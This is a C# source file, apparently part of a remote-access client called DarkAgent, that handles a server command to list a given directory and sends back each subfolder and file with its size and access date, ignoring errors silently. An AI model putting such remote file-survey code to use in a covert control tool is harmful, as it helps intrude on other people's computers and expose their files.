using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;
using System.Threading;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_FileMgrGetFiles : ReceiveBasePacket
    {
        public R_FileMgrGetFiles(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private string DirLocation;

        public override void Read()
        {
            DirLocation = ReadString();
        }

        public override void Run()
        {
            //Multi-threading ftw
            ThreadPool.QueueUserWorkItem(new WaitCallback(SendFolders));
            ThreadPool.QueueUserWorkItem(new WaitCallback(SendFiles));
        }

        private void SendFolders(object obj)
        {
            try
            {
                DirectoryInfo Folders = new DirectoryInfo(DirLocation);
                if (!Folders.Exists)
                    return;

                foreach (DirectoryInfo Folder in Folders.GetDirectories())
                {
                    FileMgrDirInfo info = new FileMgrDirInfo();
                    info.Name = Folder.Name;
                    info.SubDir = DirLocation;
                    Client.SendPacket(new S_FileMgrGetFolders(Client, info));
                }
            }
            catch { }
        }

        private void SendFiles(object obj)
        {
            try
            {
                DirectoryInfo Folders = new DirectoryInfo(DirLocation);
                if (!Folders.Exists)
                    return;

                FileInfo[] Files = Folders.GetFiles("*.*");
                foreach (FileInfo file in Files)
                {
                    FileMgrFileInfo info = new FileMgrFileInfo();
                    info.FileName = file.Name.ToString();
                    info.Date = file.LastAccessTimeUtc.ToString();
                    info.Extension = file.Extension.ToString();
                    info.Size = file.Length.ToString();
                    info.FileLocation = DirLocation;
                    Client.SendPacket(new S_FileMgrGetFiles(Client, info));
                }
            }catch{}
        }
    }
}
